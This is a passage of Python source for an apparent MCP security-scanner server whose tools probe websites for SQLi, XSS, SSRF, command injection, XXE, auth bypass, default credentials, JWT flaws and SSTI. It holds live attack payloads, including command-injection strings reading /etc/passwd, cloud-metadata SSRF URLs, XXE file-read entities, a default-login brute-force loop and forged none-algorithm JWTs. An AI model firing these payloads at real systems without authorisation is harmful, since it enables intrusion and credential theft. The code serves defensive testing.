                if len_diff > baseline_length * 0.1 and len_diff > 50:
                    vulns.append({
                        "type": "Boolean-based Blind SQLi",
                        "severity": "HIGH",
                        "param": p,
                        "payload": f"TRUE: {true_payload} | FALSE: {false_payload}",
                        "evidence": f"响应长度差异: {len_diff} bytes",
                        "url": true_url
                    })
                    break
            except Exception:
                pass

    return {"success": True, "url": url, "sqli_vulns": vulns, "total": len(vulns), "deep_scan": deep_scan}

@mcp.tool()
def xss_detect(url: str, param: str = None) -> dict:
    """XSS检测 - 自动检测跨站脚本漏洞"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'\"><script>alert(1)</script>",
        "javascript:alert(1)",
        "<body onload=alert(1)>"
    ]

    base_url = url
    test_params = [param] if param else ["search", "q", "query", "keyword", "name", "input", "text", "msg"]

    for p in test_params:
        for payload in payloads:
            try:
                if "?" in base_url:
                    test_url = f"{base_url}&{p}={requests.utils.quote(payload)}"
                else:
                    test_url = f"{base_url}?{p}={requests.utils.quote(payload)}"

                resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

                # 检查payload是否被反射
                if payload in resp.text or payload.replace('"', '&quot;') in resp.text:
                    vulns.append({
                        "type": "Reflected XSS",
                        "severity": "HIGH",
                        "param": p,
                        "payload": payload,
                        "url": test_url
                    })
                    break
            except Exception:
                pass

    return {"success": True, "url": url, "xss_vulns": vulns, "total": len(vulns)}

@mcp.tool()
def csrf_detect(url: str) -> dict:
    """CSRF检测 - 检测跨站请求伪造漏洞"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    try:
        resp = requests.get(url, timeout=10, verify=get_verify_ssl())
        html = resp.text.lower()
        headers = resp.headers

        # 检查CSRF Token
        has_csrf_token = any(token in html for token in [
            "csrf", "_token", "authenticity_token", "csrfmiddlewaretoken",
            "__requestverificationtoken", "antiforgery"
        ])

        # 检查SameSite Cookie
        cookies = resp.cookies
        samesite_missing = []
        for cookie in cookies:
            cookie_str = str(resp.headers.get('Set-Cookie', ''))
            if 'samesite' not in cookie_str.lower():
                samesite_missing.append(cookie.name)

        # 检查表单
        import re
        forms = re.findall(r'<form[^>]*>(.*?)</form>', html, re.DOTALL)
        forms_without_csrf = 0
        for form in forms:
            if not any(token in form for token in ["csrf", "_token", "authenticity"]):
                forms_without_csrf += 1

        if not has_csrf_token and forms_without_csrf > 0:
            vulns.append({
                "type": "Missing CSRF Token",
                "severity": "HIGH",
                "detail": f"发现 {forms_without_csrf} 个表单缺少CSRF Token"
            })

        if samesite_missing:
            vulns.append({
                "type": "Missing SameSite Cookie",
                "severity": "MEDIUM",
                "cookies": samesite_missing
            })

        # 检查Referer验证
        resp2 = requests.get(url, headers={"Referer": "https://evil.com"}, timeout=10, verify=get_verify_ssl())
        if resp2.status_code == resp.status_code:
            vulns.append({
                "type": "No Referer Validation",
                "severity": "LOW",
                "detail": "服务器未验证Referer头"
            })

    except Exception as e:
        return {"success": False, "error": str(e)}

    return {"success": True, "url": url, "csrf_vulns": vulns, "total": len(vulns)}

@mcp.tool()
def ssrf_detect(url: str, param: str = None) -> dict:
    """SSRF检测 - 检测服务端请求伪造漏洞"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    # SSRF测试payload
    payloads = [
        "http://127.0.0.1",
        "http://localhost",
        "http://[::1]",
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata
        "http://metadata.google.internal/",  # GCP metadata
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_INFO"
    ]

    test_params = [param] if param else ["url", "uri", "path", "src", "source", "link", "redirect", "target", "dest", "fetch", "proxy"]

    for p in test_params:
        for payload in payloads:
            try:
                if "?" in url:
                    test_url = f"{url}&{p}={requests.utils.quote(payload)}"
                else:
                    test_url = f"{url}?{p}={requests.utils.quote(payload)}"

                resp = requests.get(test_url, timeout=10, verify=get_verify_ssl(), allow_redirects=False)

                # 检测SSRF特征
                indicators = [
                    "root:", "localhost", "127.0.0.1", "internal",
                    "ami-id", "instance-id", "meta-data",
                    "redis_version", "connected_clients"
                ]

                for indicator in indicators:
                    if indicator in resp.text.lower():
                        vulns.append({
                            "type": "SSRF",
                            "severity": "CRITICAL",
                            "param": p,
                            "payload": payload,
                            "evidence": indicator,
                            "url": test_url
                        })
                        break
            except Exception:
                pass

    return {"success": True, "url": url, "ssrf_vulns": vulns, "total": len(vulns)}

@mcp.tool()
def cmd_inject_detect(url: str, param: str = None) -> dict:
    """命令注入检测 - 检测OS命令注入漏洞"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    # 命令注入payload
    payloads = [
        "; id", "| id", "|| id", "&& id", "& id",
        "; whoami", "| whoami", "|| whoami",
        "`id`", "$(id)", "${id}",
        "; sleep 5", "| sleep 5", "& timeout 5",
        "| cat /etc/passwd", "; type C:\\Windows\\win.ini"
    ]

    indicators = [
        "uid=", "gid=", "groups=",  # Linux id命令
        "root:", "daemon:", "bin:",  # /etc/passwd
        "extensions",  # win.ini
        "for 16-bit app support"  # win.ini
    ]

    test_params = [param] if param else ["cmd", "exec", "command", "ping", "query", "host", "ip", "file", "path", "dir"]

    for p in test_params:
        for payload in payloads:
            try:
                if "?" in url:
                    test_url = f"{url}&{p}={requests.utils.quote(payload)}"
                else:
                    test_url = f"{url}?{p}={requests.utils.quote(payload)}"

                resp = requests.get(test_url, timeout=15, verify=get_verify_ssl())

                for indicator in indicators:
                    if indicator in resp.text:
                        vulns.append({
                            "type": "Command Injection",
                            "severity": "CRITICAL",
                            "param": p,
                            "payload": payload,
                            "evidence": indicator,
                            "url": test_url
                        })
                        break
            except Exception:
                pass

    return {"success": True, "url": url, "cmd_vulns": vulns, "total": len(vulns)}

@mcp.tool()
def xxe_detect(url: str) -> dict:
    """XXE检测 - 检测XML外部实体注入漏洞"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    # XXE payload
    payloads = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22">]><foo>&xxe;</foo>',
    ]

    headers = {"Content-Type": "application/xml"}

    for payload in payloads:
        try:
            resp = requests.post(url, data=payload, headers=headers, timeout=10, verify=get_verify_ssl())

            indicators = ["root:", "daemon:", "extensions", "for 16-bit"]
            for indicator in indicators:
                if indicator in resp.text:
                    vulns.append({
                        "type": "XXE",
                        "severity": "CRITICAL",
                        "payload": payload[:100] + "...",
                        "evidence": indicator
                    })
                    break

            # 检测错误信息泄露
            if any(err in resp.text.lower() for err in ["xml", "parser", "entity", "dtd"]):
                vulns.append({
                    "type": "XXE Error Disclosure",
                    "severity": "MEDIUM",
                    "detail": "XML解析错误信息泄露"
                })
        except Exception:
            pass

    return {"success": True, "url": url, "xxe_vulns": vulns, "total": len(vulns)}

@mcp.tool()
def idor_detect(url: str, param: str = "id") -> dict:
    """IDOR检测 - 检测不安全的直接对象引用漏洞"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    findings = []

    # 测试数字ID遍历
    test_ids = ["1", "2", "100", "1000", "0", "-1", "999999"]

    for test_id in test_ids:
        try:
            if "?" in url:
                test_url = f"{url}&{param}={test_id}"
            else:
                test_url = f"{url}?{param}={test_id}"

            resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

            if resp.status_code == 200 and len(resp.content) > 100:
                findings.append({
                    "id": test_id,
                    "status": resp.status_code,
                    "size": len(resp.content)
                })
        except Exception:
            pass

    # 分析结果
    if len(findings) > 1:
        sizes = [f["size"] for f in findings]
        if len(set(sizes)) > 1:  # 不同ID返回不同内容
            vulns.append({
                "type": "Potential IDOR",
                "severity": "HIGH",
                "param": param,
                "detail": f"参数 {param} 可能存在IDOR漏洞，不同ID返回不同内容",
                "findings": findings
            })

    return {"success": True, "url": url, "idor_vulns": vulns, "total": len(vulns)}

@mcp.tool()
def file_upload_detect(url: str) -> dict:
    """文件上传漏洞检测 - 检测不安全的文件上传"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []

    # 测试文件类型
    test_files = [
        ("test.php", "<?php echo 'test'; ?>", "application/x-php"),
        ("test.php.jpg", "<?php echo 'test'; ?>", "image/jpeg"),
        ("test.phtml", "<?php echo 'test'; ?>", "text/html"),
        ("test.php%00.jpg", "<?php echo 'test'; ?>", "image/jpeg"),
        ("test.jsp", "<% out.println(\"test\"); %>", "application/x-jsp"),
        ("test.asp", "<% Response.Write(\"test\") %>", "application/x-asp"),
        ("test.svg", "<svg onload=alert(1)>", "image/svg+xml"),
        ("test.html", "<script>alert(1)</script>", "text/html"),
    ]

    # 查找上传表单
    try:
        resp = requests.get(url, timeout=10, verify=get_verify_ssl())
        html = resp.text.lower()

        # 检查是否有文件上传表单
        has_upload = 'type="file"' in html or "multipart/form-data" in html

        if has_upload:
            vulns.append({
                "type": "File Upload Form Found",
                "severity": "INFO",
                "detail": "发现文件上传功能，需要手动测试"
            })

            # 检查是否有客户端验证
            if "accept=" in html:
                vulns.append({
                    "type": "Client-side Validation Only",
                    "severity": "MEDIUM",
                    "detail": "仅有客户端文件类型验证，可能被绕过"
                })

    except Exception as e:
        return {"success": False, "error": str(e)}

    return {
        "success": True,
        "url": url,
        "upload_vulns": vulns,
        "total": len(vulns),
        "test_payloads": [f[0] for f in test_files],
        "note": "文件上传漏洞需要手动测试，以上为建议测试的文件类型"
    }

@mcp.tool()
def auth_bypass_detect(url: str) -> dict:
    """认证绕过检测 - 检测常见认证绕过漏洞"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []

    # 测试路径
    bypass_paths = [
        "/admin", "/admin/", "/admin//", "/admin/./",
        "/Admin", "/ADMIN", "/administrator",
        "/admin%20", "/admin%00", "/admin..;/",
        "/admin;", "/admin.json", "/admin.html",
        "//admin", "///admin", "/./admin",
        "/admin?", "/admin#", "/admin%2f"
    ]

    # 测试头部绕过
    bypass_headers = [
        {"X-Original-URL": "/admin"},
        {"X-Rewrite-URL": "/admin"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Forwarded-Host": "localhost"},
        {"X-Custom-IP-Authorization": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
    ]

    base_url = url.rstrip('/')

    # 路径绕过测试
    for path in bypass_paths:
        try:
            test_url = base_url + path
            resp = requests.get(test_url, timeout=5, verify=get_verify_ssl(), allow_redirects=False)

            if resp.status_code == 200:
                vulns.append({
                    "type": "Path Bypass",
                    "severity": "HIGH",
                    "path": path,
                    "status": resp.status_code
                })
        except Exception:
            pass

    # 头部绕过测试
    for headers in bypass_headers:
        try:
            resp = requests.get(base_url + "/admin", headers=headers, timeout=5, verify=get_verify_ssl(), allow_redirects=False)

            if resp.status_code == 200:
                vulns.append({
                    "type": "Header Bypass",
                    "severity": "HIGH",
                    "headers": headers,
                    "status": resp.status_code
                })
        except Exception:
            pass

    return {"success": True, "url": url, "auth_bypass_vulns": vulns, "total": len(vulns)}

@mcp.tool()
def logic_vuln_check(url: str) -> dict:
    """逻辑漏洞检测 - 检测常见业务逻辑漏洞"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    findings = []
    recommendations = []

    try:
        resp = requests.get(url, timeout=10, verify=get_verify_ssl())
        html = resp.text.lower()

        # 1. 检测价格/数量参数
        price_params = ["price", "amount", "quantity", "qty", "total", "discount", "coupon"]
        for param in price_params:
            if param in html:
                findings.append({
                    "type": "Price/Quantity Parameter",
                    "severity": "MEDIUM",
                    "detail": f"发现 {param} 参数，可能存在价格篡改漏洞"
                })
                recommendations.append(f"测试 {param} 参数是否可被篡改为负数或极小值")

        # 2. 检测验证码
        if "captcha" in html or "验证码" in html:
            findings.append({
                "type": "Captcha Found",
                "severity": "INFO",
                "detail": "发现验证码，测试是否可绕过"
            })
            recommendations.append("测试验证码是否可重复使用、是否可删除参数绕过")

        # 3. 检测短信/邮件验证
        if any(x in html for x in ["sms", "短信", "验证码", "email", "邮箱"]):
            findings.append({
                "type": "SMS/Email Verification",
                "severity": "INFO",
                "detail": "发现短信/邮箱验证功能"
            })
            recommendations.append("测试验证码是否可爆破、是否有频率限制")

        # 4. 检测支付相关
        if any(x in html for x in ["pay", "payment", "支付", "checkout", "order"]):
            findings.append({
                "type": "Payment Function",
                "severity": "HIGH",
                "detail": "发现支付功能，需重点测试"
            })
            recommendations.extend([
                "测试订单金额是否可篡改",
                "测试是否可修改支付状态",
                "测试是否存在并发支付漏洞"
            ])

        # 5. 检测用户相关
        if any(x in html for x in ["user", "profile", "account", "用户", "个人"]):
            findings.append({
                "type": "User Function",
                "severity": "MEDIUM",
                "detail": "发现用户功能"
            })
            recommendations.extend([
                "测试是否可越权访问其他用户信息",
                "测试密码重置流程是否安全",
                "测试是否可批量注册"
            ])

        # 6. 检测API接口
        if any(x in html for x in ["api", "/v1/", "/v2/", "graphql"]):
            findings.append({
                "type": "API Endpoint",
                "severity": "MEDIUM",
                "detail": "发现API接口"
            })
            recommendations.extend([
                "测试API是否有认证",
                "测试是否存在未授权访问",
                "测试是否有速率限制"
            ])

    except Exception as e:
        return {"success": False, "error": str(e)}

    return {
        "success": True,
        "url": url,
        "findings": findings,
        "recommendations": recommendations,
        "note": "逻辑漏洞需要结合业务场景手动测试，以上为自动化检测建议"
    }


# ==================== OWASP补充工具 ====================

@mcp.tool()
def deserialize_detect(url: str, param: str = None) -> dict:
    """反序列化漏洞检测 - 检测Java/PHP/Python反序列化漏洞 (A08)"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    findings = []

    # Java反序列化特征
    java_payloads = [
        ("aced0005", "Java序列化魔数"),
        ("rO0AB", "Java Base64序列化"),
        ("H4sIAAAA", "Java Gzip序列化"),
    ]

    # PHP反序列化特征
    php_payloads = [
        ('O:8:"stdClass"', "PHP对象序列化"),
        ("a:1:{", "PHP数组序列化"),
        ("s:4:", "PHP字符串序列化"),
    ]

    # Python pickle特征
    python_payloads = [
        ("gASV", "Python Pickle Base64"),
        ("(dp0", "Python Pickle"),
        ("cos\nsystem", "Python Pickle RCE"),
    ]

    try:
        resp = requests.get(url, timeout=10, verify=get_verify_ssl())
        content = resp.text
        cookies = resp.cookies.get_dict()

        # 检查响应内容
        for payload, desc in java_payloads + php_payloads + python_payloads:
            if payload in content:
                findings.append({
                    "type": "Response Content",
                    "pattern": payload,
                    "description": desc,
                    "severity": "HIGH"
                })

        # 检查Cookie
        for name, value in cookies.items():
            for payload, desc in java_payloads + php_payloads + python_payloads:
                if payload in value:
                    findings.append({
                        "type": "Cookie",
                        "cookie_name": name,
                        "pattern": payload,
                        "description": desc,
                        "severity": "CRITICAL"
                    })

        # 检查常见反序列化端点
        deser_endpoints = [
            "/invoker/readonly", "/invoker/JMXInvokerServlet",  # JBoss
            "/_async/AsyncResponseService", "/wls-wsat/",  # WebLogic
            "/solr/admin/cores", "/actuator",  # Spring
        ]

        base_url = url.rstrip('/')
        for endpoint in deser_endpoints:
            try:
                r = requests.get(f"{base_url}{endpoint}", timeout=5, verify=get_verify_ssl())
                if r.status_code != 404:
                    findings.append({
                        "type": "Dangerous Endpoint",
                        "endpoint": endpoint,
                        "status_code": r.status_code,
                        "severity": "HIGH"
                    })
            except Exception:
                pass

        # 测试参数注入
        if param:
            test_payloads = [
                ('O:8:"stdClass":0:{}', "PHP"),
                ("rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "Java"),
            ]
            for payload, lang in test_payloads:
                try:
                    test_url = f"{url}?{param}={payload}"
                    r = requests.get(test_url, timeout=5, verify=get_verify_ssl())
                    if r.status_code == 500 or "exception" in r.text.lower():
                        findings.append({
                            "type": "Parameter Injection",
                            "param": param,
                            "language": lang,
                            "severity": "CRITICAL",
                            "detail": "参数可能存在反序列化漏洞"
                        })
                except Exception:
                    pass

    except Exception as e:
        return {"success": False, "error": str(e)}

    return {
        "success": True,
        "url": url,
        "vulnerable": len(findings) > 0,
        "findings": findings,
        "recommendations": [
            "避免反序列化不可信数据",
            "使用白名单验证反序列化类",
            "升级到安全版本的序列化库",
            "使用JSON等安全的数据格式替代"
        ] if findings else []
    }


@mcp.tool()
def weak_password_detect(url: str, username: str = None) -> dict:
    """弱密码/默认凭证检测 - 检测常见弱密码和默认凭证 (A07)"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    findings = []

    # 常见默认凭证
    default_creds = [
        ("admin", "admin"), ("admin", "123456"), ("admin", "password"),
        ("admin", "admin123"), ("root", "root"), ("root", "toor"),
        ("test", "test"), ("guest", "guest"), ("user", "user"),
        ("administrator", "administrator"), ("admin", ""),
        ("tomcat", "tomcat"), ("manager", "manager"),
    ]

    # 常见登录端点
    login_endpoints = [
        "/login", "/admin/login", "/user/login", "/api/login",
        "/auth/login", "/signin", "/admin", "/manager/html",
        "/wp-login.php", "/administrator",
    ]

    try:
        base_url = url.rstrip('/')

        # 查找登录页面
        login_found = []
        for endpoint in login_endpoints:
            try:
                r = requests.get(f"{base_url}{endpoint}", timeout=5, verify=get_verify_ssl())
                if r.status_code == 200 and any(x in r.text.lower() for x in ["password", "login", "密码", "登录"]):
                    login_found.append(endpoint)
            except Exception:
                pass

        # 测试默认凭证
        for endpoint in login_found[:3]:  # 限制测试数量
            login_url = f"{base_url}{endpoint}"

            # 尝试识别登录表单
            try:
                r = requests.get(login_url, timeout=5, verify=get_verify_ssl())

                # 简单的表单字段识别
                user_fields = ["username", "user", "login", "email", "account"]
                pass_fields = ["password", "pass", "pwd"]

                for user, pwd in default_creds[:10]:  # 限制尝试次数
                    if username:
                        user = username

                    for uf in user_fields:
                        for pf in pass_fields:
                            try:
                                data = {uf: user, pf: pwd}
                                resp = requests.post(login_url, data=data, timeout=5, verify=get_verify_ssl(), allow_redirects=False)

                                # 检测登录成功特征
                                if resp.status_code in [302, 303] or \
                                   "logout" in resp.text.lower() or \
                                   "dashboard" in resp.text.lower() or \
                                   "welcome" in resp.text.lower():
                                    findings.append({
                                        "type": "Weak Credential",
                                        "endpoint": endpoint,
                                        "username": user,
                                        "password": pwd,
                                        "severity": "CRITICAL"
                                    })
                                    break
                            except Exception:
                                pass
                        if findings:
                            break
                    if findings:
                        break
            except Exception:
                pass

        # 检测常见管理后台默认凭证
        admin_panels = {
            "/phpmyadmin/": [("root", ""), ("root", "root")],
            "/adminer.php": [("root", ""), ("root", "root")],
            "/manager/html": [("tomcat", "tomcat"), ("admin", "admin")],
        }

        for panel, creds in admin_panels.items():
            try:
                r = requests.get(f"{base_url}{panel}", timeout=5, verify=get_verify_ssl())
                if r.status_code == 200:
                    findings.append({
                        "type": "Admin Panel Found",
                        "endpoint": panel,
                        "default_creds": creds,
                        "severity": "MEDIUM",
                        "detail": "发现管理面板，建议测试默认凭证"
                    })
            except Exception:
                pass

    except Exception as e:
        return {"success": False, "error": str(e)}

    return {
        "success": True,
        "url": url,
        "login_pages": login_found if 'login_found' in dir() else [],
        "vulnerable": len([f for f in findings if f["type"] == "Weak Credential"]) > 0,
        "findings": findings,
        "recommendations": [
            "强制使用强密码策略",
            "修改所有默认凭证",
            "启用账户锁定机制",
            "实施多因素认证",
            "添加登录失败延迟"
        ] if findings else []
    }


@mcp.tool()
def security_headers_check(url: str) -> dict:
    """HTTP安全头检测 - 检测缺失或配置错误的安全头 (A05)"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    # 安全头定义
    security_headers = {
        "Strict-Transport-Security": {
            "severity": "HIGH",
            "description": "HSTS - 强制HTTPS连接",
            "recommendation": "添加: Strict-Transport-Security: max-age=31536000; includeSubDomains"
        },
        "X-Content-Type-Options": {
            "severity": "MEDIUM",
            "description": "防止MIME类型嗅探",
            "recommendation": "添加: X-Content-Type-Options: nosniff"
        },
        "X-Frame-Options": {
            "severity": "MEDIUM",
            "description": "防止点击劫持",
            "recommendation": "添加: X-Frame-Options: DENY 或 SAMEORIGIN"
        },
        "X-XSS-Protection": {
            "severity": "LOW",
            "description": "XSS过滤器(已弃用但仍建议)",
            "recommendation": "添加: X-XSS-Protection: 1; mode=block"
        },
        "Content-Security-Policy": {
            "severity": "HIGH",
            "description": "CSP - 防止XSS和数据注入",
            "recommendation": "添加严格的CSP策略"
        },
        "Referrer-Policy": {
            "severity": "LOW",
            "description": "控制Referrer信息泄露",
            "recommendation": "添加: Referrer-Policy: strict-origin-when-cross-origin"
        },
        "Permissions-Policy": {
            "severity": "LOW",
            "description": "控制浏览器功能权限",
            "recommendation": "添加: Permissions-Policy: geolocation=(), microphone=()"
        },
    }

    # 危险头
    dangerous_headers = {
        "Server": "泄露服务器信息",
        "X-Powered-By": "泄露技术栈信息",
        "X-AspNet-Version": "泄露ASP.NET版本",
        "X-AspNetMvc-Version": "泄露MVC版本",
    }

    try:
        resp = requests.get(url, timeout=10, verify=get_verify_ssl())
        headers = {k.lower(): v for k, v in resp.headers.items()}

        missing = []
        present = []
        dangerous = []

        # 检查缺失的安全头
        for header, info in security_headers.items():
            if header.lower() not in headers:
                missing.append({
                    "header": header,
                    "severity": info["severity"],
                    "description": info["description"],
                    "recommendation": info["recommendation"]
                })
            else:
                present.append({
                    "header": header,
                    "value": headers[header.lower()],
                    "status": "OK"
                })

        # 检查危险头
        for header, desc in dangerous_headers.items():
            if header.lower() in headers:
                dangerous.append({
                    "header": header,
                    "value": headers[header.lower()],
                    "description": desc,
                    "severity": "LOW",
                    "recommendation": f"移除或隐藏 {header} 头"
                })

        # 检查Cookie安全属性
        cookie_issues = []
        set_cookie = resp.headers.get("Set-Cookie", "")
        if set_cookie:
            if "httponly" not in set_cookie.lower():
                cookie_issues.append({
                    "issue": "Missing HttpOnly",
                    "severity": "MEDIUM",
                    "description": "Cookie缺少HttpOnly标志，可能被XSS窃取"
                })
            if "secure" not in set_cookie.lower() and url.startswith("https"):
                cookie_issues.append({
                    "issue": "Missing Secure",
                    "severity": "MEDIUM",
                    "description": "Cookie缺少Secure标志，可能通过HTTP泄露"
                })
            if "samesite" not in set_cookie.lower():
                cookie_issues.append({
                    "issue": "Missing SameSite",
                    "severity": "LOW",
                    "description": "Cookie缺少SameSite标志，可能受CSRF攻击"
                })

        # 计算安全评分
        score = 100
        for m in missing:
            if m["severity"] == "HIGH":
                score -= 15
            elif m["severity"] == "MEDIUM":
                score -= 10
            else:
                score -= 5
        for d in dangerous:
            score -= 5
        for c in cookie_issues:
            if c["severity"] == "MEDIUM":
                score -= 10
            else:
                score -= 5
        score = max(0, score)

    except Exception as e:
        return {"success": False, "error": str(e)}

    return {
        "success": True,
        "url": url,
        "security_score": score,
        "grade": "A" if score >= 90 else "B" if score >= 70 else "C" if score >= 50 else "D" if score >= 30 else "F",
        "missing_headers": missing,
        "present_headers": present,
        "dangerous_headers": dangerous,
        "cookie_issues": cookie_issues,
        "summary": f"缺失 {len(missing)} 个安全头，发现 {len(dangerous)} 个信息泄露头"
    }


@mcp.tool()
def jwt_vuln_detect(url: str, token: str = None) -> dict:
    """JWT漏洞检测 - 检测JWT认证相关漏洞 (A01/A07)"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    import base64
    import json

    findings = []
    jwt_info = None

    def decode_jwt(token):
        """解码JWT (不验证签名)"""
        try:
            parts = token.split('.')
            if len(parts) != 3:
                return None

            # 解码header和payload
            def b64_decode(data):
                padding = 4 - len(data) % 4
                if padding != 4:
                    data += '=' * padding
                return base64.urlsafe_b64decode(data)

            header = json.loads(b64_decode(parts[0]))
            payload = json.loads(b64_decode(parts[1]))

            return {"header": header, "payload": payload, "signature": parts[2]}
        except Exception:
            return None

    try:
        # 如果没有提供token，尝试从响应中获取
        if not token:
            resp = requests.get(url, timeout=10, verify=get_verify_ssl())

            # 检查响应头
            auth_header = resp.headers.get("Authorization", "")
            if auth_header.startswith("Bearer "):
                token = auth_header[7:]

            # 检查Cookie
            for name, value in resp.cookies.items():
                if value.count('.') == 2 and len(value) > 50:
                    decoded = decode_jwt(value)
                    if decoded:
                        token = value
                        findings.append({
                            "type": "JWT in Cookie",
                            "cookie_name": name,
                            "severity": "INFO"
                        })
                        break

            # 检查响应体
            if not token and "eyJ" in resp.text:
                import re
                jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
                matches = re.findall(jwt_pattern, resp.text)
                if matches:
                    token = matches[0]

        if token:
            jwt_info = decode_jwt(token)

            if jwt_info:
                header = jwt_info["header"]
                payload = jwt_info["payload"]

                # 1. 检查算法
                alg = header.get("alg", "").upper()
                if alg == "NONE":
                    findings.append({
                        "type": "Algorithm None",
                        "severity": "CRITICAL",
                        "description": "JWT使用none算法，签名可被绕过"
                    })
                elif alg in ["HS256", "HS384", "HS512"]:
                    findings.append({
                        "type": "Symmetric Algorithm",
                        "algorithm": alg,
                        "severity": "MEDIUM",
                        "description": "使用对称加密，可能存在密钥爆破风险"
                    })

                # 2. 检查敏感信息
                sensitive_keys = ["password", "pwd", "secret", "key", "token", "credit", "ssn"]
                for key in payload.keys():
                    if any(s in key.lower() for s in sensitive_keys):
                        findings.append({
                            "type": "Sensitive Data in Payload",
                            "key": key,
                            "severity": "HIGH",
                            "description": f"JWT payload包含敏感字段: {key}"
                        })

                # 3. 检查过期时间
                import time
                exp = payload.get("exp")
                if not exp:
                    findings.append({
                        "type": "No Expiration",
                        "severity": "MEDIUM",
                        "description": "JWT没有设置过期时间"
                    })
                elif exp < time.time():
                    findings.append({
                        "type": "Expired Token",
                        "severity": "INFO",
                        "description": "JWT已过期但仍在使用"
                    })

                # 4. 检查jku/x5u头注入
                if "jku" in header:
                    findings.append({
                        "type": "JKU Header Present",
                        "value": header["jku"],
                        "severity": "HIGH",
                        "description": "存在jku头，可能存在密钥注入漏洞"
                    })
                if "x5u" in header:
                    findings.append({
                        "type": "X5U Header Present",
                        "value": header["x5u"],
                        "severity": "HIGH",
                        "description": "存在x5u头，可能存在证书注入漏洞"
                    })

                # 5. 检查kid注入
                if "kid" in header:
                    findings.append({
                        "type": "KID Header Present",
                        "value": header["kid"],
                        "severity": "MEDIUM",
                        "description": "存在kid头，测试SQL注入/路径遍历"
                    })

                # 6. 测试算法混淆攻击
                # 生成none算法的token进行测试
                try:
                    none_header = base64.urlsafe_b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
                    none_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
                    none_token = f"{none_header}.{none_payload}."

                    # 测试none算法是否被接受
                    test_resp = requests.get(url, headers={"Authorization": f"Bearer {none_token}"}, timeout=5, verify=get_verify_ssl())
                    if test_resp.status_code != 401:
                        findings.append({
                            "type": "Algorithm Confusion",
                            "severity": "CRITICAL",
                            "description": "服务器接受none算法JWT，存在认证绕过"
                        })
                except Exception:
                    pass

    except Exception as e:
        return {"success": False, "error": str(e)}

    return {
        "success": True,
        "url": url,
        "jwt_found": token is not None,
        "jwt_info": jwt_info,
        "vulnerable": any(f["severity"] in ["CRITICAL", "HIGH"] for f in findings),
        "findings": findings,
        "recommendations": [
            "使用RS256等非对称算法",
            "设置合理的过期时间",
            "不在payload中存储敏感信息",
            "验证alg头，拒绝none算法",
            "使用强密钥(至少256位)"
        ] if findings else []
    }


# ==================== 高级漏洞检测工具 ====================

@mcp.tool()
def ssti_detect(url: str, param: str = None) -> dict:
    """SSTI模板注入检测 - 检测服务端模板注入漏洞"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    findings = []

    # SSTI测试payload (按模板引擎分类)
    payloads = {
        "jinja2": [
            ("{{7*7}}", "49"),
            ("{{config}}", "Config"),
            ("{{self.__class__}}", "class"),
        ],
        "twig": [
            ("{{7*7}}", "49"),
            ("{{_self.env}}", "Environment"),
        ],
        "freemarker": [
            ("${7*7}", "49"),
            ("${.version}", "version"),
        ],
        "velocity": [
            ("#set($x=7*7)$x", "49"),
        ],
        "smarty": [
            ("{$smarty.version}", "Smarty"),
            ("{7*7}", "49"),
        ],
        "mako": [
            ("${7*7}", "49"),
        ],
        "erb": [
            ("<%=7*7%>", "49"),
        ],
        "thymeleaf": [
            ("[[${7*7}]]", "49"),
        ],
    }

    try:
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

        # 获取参数
        params = []
        if param:
            params = [param]
        elif parsed.query:
            params = [p.split('=')[0] for p in parsed.query.split('&') if '=' in p]

        if not params:
            params = ["q", "search", "query", "name", "input", "template", "page", "view"]

        for p in params[:5]:
            for engine, tests in payloads.items():
                for payload, expected in tests:
                    try:
                        test_url = f"{base_url}?{p}={requests.utils.quote(payload)}"
                        resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

                        if expected in resp.text:
                            findings.append({
                                "type": "SSTI",
                                "engine": engine,
                                "param": p,
                                "payload": payload,
                                "severity": "CRITICAL",
                                "detail": f"检测到{engine}模板注入"
                            })
                            break
                    except Exception:
                        pass

    except Exception as e:
        return {"success": False, "error": str(e)}

    return {
